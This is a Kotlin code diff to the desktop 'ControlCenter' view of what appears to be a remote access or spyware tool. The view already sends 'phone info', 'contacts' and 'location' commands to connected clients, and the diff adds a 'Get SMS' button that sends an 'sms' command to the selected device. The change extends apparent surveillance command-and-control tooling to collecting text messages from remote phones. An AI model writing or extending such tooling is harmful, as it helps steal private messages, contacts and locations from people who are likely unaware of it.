@@ -51,6 +51,12 @@ class MainView: View("ControlCenter") {
         borderpaneConstraints { alignment = Pos.CENTER }
     }
 
+    private val btSms = button {
+        text = "Get SMS"
+        font = Font(14.0)
+        borderpaneConstraints { alignment = Pos.CENTER }
+    }
+
     private val taLog = textarea {
         font = Font(14.0)
 
@@ -102,6 +108,7 @@ class MainView: View("ControlCenter") {
                     add(btPhoneInfo)
                     add(btContacts)
                     add(btLocation)
+                    add(btSms)
                 }
             }
 
@@ -139,6 +146,11 @@ class MainView: View("ControlCenter") {
         btLocation.action {
             val selectedClient = tblClients.selectedItem ?: return@action
             GlobalState.serverThread?.sendCommand(selectedClient, "location")
+        }
+
+        btSms.action {
+            val selectedClient = tblClients.selectedItem ?: return@action
+            GlobalState.serverThread?.sendCommand(selectedClient, "sms")
         }
     }
 
